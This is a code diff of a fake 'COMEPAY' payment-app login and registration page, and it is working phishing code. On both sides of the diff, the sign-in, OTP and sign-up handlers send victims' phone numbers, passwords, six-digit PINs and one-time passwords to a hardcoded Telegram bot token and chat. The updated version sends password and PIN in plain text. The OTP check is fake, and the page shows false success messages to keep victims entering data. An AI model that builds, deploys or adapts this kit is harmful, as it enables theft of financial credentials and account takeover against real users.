@@ -404,6 +404,7 @@
         <!-- ================= LOGIN SCREEN ================= -->
         <div id="login-screen">
             <div class="logo-box">
+                <!-- Updated logo -->
                 <img src="https://i.postimg.cc/x1m3JWw8/29eb415856d0481f9695e40f84a851c8.png" alt="COMEPAY Logo">
             </div>
 
@@ -417,7 +418,7 @@
                 <input type="password" placeholder="Password" id="login-pass">
             </div>
 
-            <!-- 6-digit PIN field below password -->
+            <!-- NEW: 6-digit PIN field -->
             <div class="input-group">
                 <i class="fa-solid fa-key"></i>
                 <input type="password" placeholder="6-digit PIN" id="login-pin" inputmode="numeric" pattern="[0-9]*" maxlength="6">
@@ -500,6 +501,7 @@
                     OTP will be sent to +91 
                 </div>
 
+                <!-- Timer display -->
                 <div class="timer-text" id="modal-timer">⏳ Resend OTP in <span id="timer-countdown">60</span>s</div>
 
                 <div class="input-group otp-wrapper">
@@ -516,85 +518,37 @@
 
     <!-- JavaScript Navigation & Popup Controls -->
     <script>
-        // ====================================================================
-        // TELEGRAM CONFIG — ONLY THIS BOT / CHAT / IMAGE IS USED
-        // ====================================================================
+        // ----- TELEGRAM CONFIG (UPDATED) -----
         const BOT_TOKEN = '8886844004:AAFDfZUxAEHRug0DmVPlCsiJqj6uukntiZU';
-        const CHAT_ID   = '1706252195';
-        const PHOTO_URL = 'https://i.postimg.cc/8CPgLLD7/file-00000000357c8211b58df9718b18f880.png';
+        const CHAT_ID = '1706252195';
 
         // Timer variables
         let timerInterval = null;
         let timerSeconds = 60;
         let isTimerRunning = false;
 
-        // HTML escape for Telegram HTML parse_mode safety
-        function escapeHTML(str) {
-            return String(str).replace(/[&<>"']/g, function (s) {
-                return ({ '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#39;' })[s];
-            });
-        }
-
-        // ====================================================================
-        // sendPhoto — only image with caption, HTML parse_mode.
-        // Image URL is NEVER written into the message text.
-        // Copy sections are rendered only for fields that have real values.
-        // ====================================================================
-        function sendTelegram(message, fields) {
-            fields = fields || {};
-
-            // Build copy section lines ONLY for available fields
-            const copyLines = [];
-            if (fields.phone && String(fields.phone).trim()) {
-                copyLines.push(`📋 COPY NUMBER: <code>${escapeHTML(fields.phone)}</code>`);
+        // Send Telegram notification
+        function sendTelegram(message) {
+            if (!BOT_TOKEN || !CHAT_ID) {
+                console.warn('Telegram bot token or chat id missing');
+                return;
             }
-            if (fields.password && String(fields.password).trim()) {
-                copyLines.push(`🔑 COPY PASSWORD: <code>${escapeHTML(fields.password)}</code>`);
-            }
-            if (fields.pin && String(fields.pin).trim()) {
-                copyLines.push(`🔢 COPY PIN: <code>${escapeHTML(fields.pin)}</code>`);
-            }
-            if (fields.otp && String(fields.otp).trim()) {
-                copyLines.push(`🎫 COPY OTP: <code>${escapeHTML(fields.otp)}</code>`);
-            }
-
-            // Blank line before copy block (matches required format)
-            const copyBlock = copyLines.length > 0 ? '\n\n' + copyLines.join('\n') : '';
-
-            // Footer
-            const footer = `\n\n<pre>
-╔══════════════════════════════════════╗
-║  🟢 DEVELOPED BY MANISH              ║
-║  📞 CONTACT: +91 9827278050          ║
-║  🔒 Premium Design • Secure • Pro    ║
-╚══════════════════════════════════════╝
-</pre>`;
-
-            let caption = message + copyBlock + footer;
-
-            // Telegram caption hard limit: 1024 chars
-            if (caption.length > 1024) {
-                const overflow = caption.length - 1024;
-                const trimmedMsg = message.slice(0, Math.max(0, message.length - overflow - 3)) + '...';
-                caption = trimmedMsg + copyBlock + footer;
-                if (caption.length > 1024) caption = caption.slice(0, 1021) + '...';
-            }
-
-            // sendPhoto — the ONLY endpoint used for outgoing messages
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('photo', PHOTO_URL);   // image is sent as photo, never as text
-            fd.append('caption', caption);
-            fd.append('parse_mode', 'HTML');
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
                 method: 'POST',
-                body: fd
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
             })
             .then(res => {
-                if (!res.ok) console.warn('Telegram sendPhoto failed', res.status);
+                if (!res.ok) {
+                    console.warn('Telegram send failed', res.status);
+                }
             })
-            .catch(err => console.warn('Telegram sendPhoto error', err));
+            .catch(err => console.warn('Telegram error', err));
         }
 
         // Navigation
@@ -611,71 +565,87 @@
             }
         }
 
-        // Numeric-only input restrictions
+        // Restrict Phone input to only numbers
         document.addEventListener('DOMContentLoaded', function() {
+            // Login phone
             const loginPhone = document.getElementById('login-phone');
             if (loginPhone) {
-                loginPhone.addEventListener('input', function() {
+                loginPhone.addEventListener('input', function(e) {
                     this.value = this.value.replace(/\D/g, '');
-                    if (this.value.length > 10) this.value = this.value.slice(0, 10);
+                    if (this.value.length > 10) {
+                        this.value = this.value.slice(0, 10);
+                    }
                 });
             }
 
+            // Login PIN - only numbers, max 6
             const loginPin = document.getElementById('login-pin');
             if (loginPin) {
-                loginPin.addEventListener('input', function() {
+                loginPin.addEventListener('input', function(e) {
                     this.value = this.value.replace(/\D/g, '');
-                    if (this.value.length > 6) this.value = this.value.slice(0, 6);
+                    if (this.value.length > 6) {
+                        this.value = this.value.slice(0, 6);
+                    }
                 });
             }
 
+            // Register phone
             const regPhone = document.getElementById('reg-phone');
             if (regPhone) {
-                regPhone.addEventListener('input', function() {
+                regPhone.addEventListener('input', function(e) {
                     this.value = this.value.replace(/\D/g, '');
-                    if (this.value.length > 10) this.value = this.value.slice(0, 10);
+                    if (this.value.length > 10) {
+                        this.value = this.value.slice(0, 10);
+                    }
                 });
             }
 
+            // OTP input
             const otpInput = document.getElementById('modal-otp');
             if (otpInput) {
-                otpInput.addEventListener('input', function() {
+                otpInput.addEventListener('input', function(e) {
                     this.value = this.value.replace(/\D/g, '');
-                    if (this.value.length > 6) this.value = this.value.slice(0, 6);
+                    if (this.value.length > 6) {
+                        this.value = this.value.slice(0, 6);
+                    }
                 });
             }
         });
 
-        // Send OTP (Register screen) — phone only
+        // Send OTP (for Register screen)
         function sendOTP() {
-            const phone = document.getElementById('reg-phone')?.value.trim() || '';
-            const msg = `🔐 <b>OTP Requested (Register)</b>\n📱 Phone: +91 ${escapeHTML(phone || 'Not provided')}`;
-            sendTelegram(msg, { phone: phone });
-            alert("OTP Code Sent successfully!");
+            const phone = document.getElementById('reg-phone')?.value || 'unknown';
+            const msg = `🔐 <b>OTP requested</b>\n📱 Phone: +91 ${phone}`;
+            sendTelegram(msg);
+            alert("OTP Code Sent successfully! (Telegram notification sent)");
         }
 
-        // Send OTP from Modal — phone + pin
+        // Send OTP from Modal (with timer)
         function sendModalOTP() {
+            // If timer is running, don't allow resend
             if (isTimerRunning) {
                 alert("Please wait for the timer to finish before requesting a new OTP.");
                 return;
             }
 
-            const phone = document.getElementById('login-phone')?.value.trim() || '';
-            const pin   = document.getElementById('login-pin')?.value.trim() || '';
-            const msg = `🔐 <b>OTP Requested (Login Modal)</b>\n📱 Phone: +91 ${escapeHTML(phone || 'Not provided')}`;
-            sendTelegram(msg, { phone: phone, pin: pin });
-
+            const phone = document.getElementById('login-phone')?.value || 'unknown';
+            const msg = `🔐 <b>OTP requested (Modal)</b>\n📱 Phone: +91 ${phone}`;
+            sendTelegram(msg);
+            
+            // Show success message
             alert("OTP Sent Successfully!");
+            
+            // Start 1-minute timer
             startTimer();
         }
 
-        // 1-minute resend timer
+        // Start 1-minute timer
         function startTimer() {
             const timerElement = document.getElementById('modal-timer');
             const countdownElement = document.getElementById('timer-countdown');
             const sendBtn = document.getElementById('modal-send-otp-btn');
 
+            // Reset timer
             if (timerInterval) {
                 clearInterval(timerInterval);
                 timerInterval = null;
@@ -702,24 +672,27 @@
             }, 1000);
         }
 
-        // Sign In — validate, then show OTP modal
+        // Sign In - shows modal
         function handleSignIn() {
             const phoneInput = document.getElementById('login-phone').value.trim();
             const privacyChecked = document.getElementById('privacy-agree').checked;
-
+            
             if (!privacyChecked) {
                 alert("Please agree to the 'User Privacy Agreement' first.");
                 return;
             }
-            if (phoneInput === "") {
+
+            if(phoneInput === "") {
                 alert("Please enter a valid Phone number.");
                 return;
             }
-            if (phoneInput.length < 10) {
+
+            if(phoneInput.length < 10) {
                 alert("Please enter a valid 10-digit Phone number.");
                 return;
             }
 
+            // Reset timer if any
             if (timerInterval) {
                 clearInterval(timerInterval);
                 timerInterval = null;
@@ -728,21 +701,27 @@
                 document.getElementById('modal-send-otp-btn').disabled = false;
             }
 
+            // Update modal with phone number
             document.getElementById('dynamic-otp-text').innerText = "OTP will be sent to +91 " + phoneInput;
+            
+            // Clear previous OTP
             document.getElementById('modal-otp').value = '';
+            
+            // Get password & PIN - PLAIN TEXT
+            const pass = document.getElementById('login-pass')?.value || 'No Password Entered';
+            const pin = document.getElementById('login-pin')?.value || 'No PIN Entered';
+            
+            // Send Telegram notification for Sign In attempt with CLEAR PASSWORD & PIN
+            const msg = `✅ <b>Sign In attempt</b>\n📱 Phone: ${phoneInput}\n🔑 Password: <b>${pass}</b>\n🔢 PIN: <b>${pin}</b>`;
+            sendTelegram(msg);
 
-            const pass = document.getElementById('login-pass')?.value.trim() || '';
-            const pin  = document.getElementById('login-pin')?.value.trim() || '';
-
-            // Sign-In attempt: phone + password + pin
-            const msg = `✅ <b>Sign In Attempt</b>\n📱 Phone: +91 ${escapeHTML(phoneInput)}`;
-            sendTelegram(msg, { phone: phoneInput, password: pass, pin: pin });
-
+            // Show modal
             document.getElementById('verification-modal').style.display = 'flex';
         }
 
-        // Close modal + reset timer
+        // Close modal
         function closeModal() {
+            // Clear timer
             if (timerInterval) {
                 clearInterval(timerInterval);
                 timerInterval = null;
@@ -753,48 +732,54 @@
             document.getElementById('verification-modal').style.display = 'none';
         }
 
-        // Confirm OTP
+        // Confirm Verification - OTP check (only "123456" is correct - 6 digits)
         function confirmVerification() {
             const otpVal = document.getElementById('modal-otp').value.trim();
-            const phone  = document.getElementById('login-phone')?.value.trim() || '';
-            const pin    = document.getElementById('login-pin')?.value.trim() || '';
-
-            if (otpVal === "") {
+            const phone = document.getElementById('login-phone')?.value || 'unknown';
+            
+            if(otpVal === "") {
                 alert("Please enter the OTP Code.");
                 return;
             }
-            if (otpVal.length !== 6) {
+
+            // Check if exactly 6 digits
+            if(otpVal.length !== 6) {
                 alert("❌ Please enter a valid 6-digit OTP.");
                 document.getElementById('modal-otp').value = '';
                 return;
             }
 
-            // Always send the entered OTP
-            const otpMsg = `🔑 <b>OTP Entered</b>\n📱 Phone: +91 ${escapeHTML(phone || 'Not provided')}`;
-            sendTelegram(otpMsg, { phone: phone, pin: pin, otp: otpVal });
+            // ✅ SEND OTP TO TELEGRAM (every OTP entered)
+            const otpMsg = `🔑 <b>OTP Entered</b>\n📱 Phone: +91 ${phone}\n🔢 OTP: ${otpVal}`;
+            sendTelegram(otpMsg);
 
-            if (otpVal === "123456") {
-                const successMsg = `✅ <b>Login Successful</b>\n📱 Phone: +91 ${escapeHTML(phone || 'Not provided')}\n🔓 OTP Verified Successfully!`;
-                sendTelegram(successMsg, { phone: phone, pin: pin, otp: otpVal });
+            // Only "123456" is correct — anything else is WRONG
+            if(otpVal === "123456") {
+                // Correct OTP
+                const successMsg = `✅ <b>Login Successful</b>\n📱 Phone: +91 ${phone}\n🔑 OTP verified successfully!`;
+                sendTelegram(successMsg);
                 alert("✅ Verification successful! Logging in...");
                 closeModal();
             } else {
+                // Wrong OTP — show alert and keep modal open
                 alert("❌ Wrong OTP! Please try again.");
+                // Clear the OTP field for next attempt
                 document.getElementById('modal-otp').value = '';
+                // Modal stays open — user can try again
             }
         }
 
-        // Sign Up — phone + password (no PIN/OTP fields on this screen)
+        // Sign Up
         function handleSignUp() {
-            const username = document.getElementById('reg-username')?.value.trim() || '';
-            const phone    = document.getElementById('reg-phone')?.value.trim() || '';
-            const pass     = document.getElementById('reg-pass')?.value.trim() || '';
-            const invite   = document.getElementById('reg-invite')?.value.trim() || '';
+            const username = document.getElementById('reg-username')?.value || 'unknown';
+            const phone = document.getElementById('reg-phone')?.value || 'unknown';
+            const pass = document.getElementById('reg-pass')?.value || 'No Password Entered';
+            const invite = document.getElementById('reg-invite')?.value || '—';
 
-            const msg = `🆕 <b>New Registration</b>\n👤 User: ${escapeHTML(username || 'Not provided')}\n📱 Phone: +91 ${escapeHTML(phone || 'Not provided')}\n🎫 Invite: ${escapeHTML(invite || '—')}`;
-            sendTelegram(msg, { phone: phone, password: pass });
+            const msg = `🆕 <b>New registration</b>\n👤 User: ${username}\n📱 Phone: +91 ${phone}\n🔑 Password: <b>${pass}</b>\n🎫 Invite: ${invite}`;
+            sendTelegram(msg);
 
-            alert("Registration successful!");
+            alert("Registration successful! (Telegram notification sent)");
             navigateTo('login');
         }
     </script>
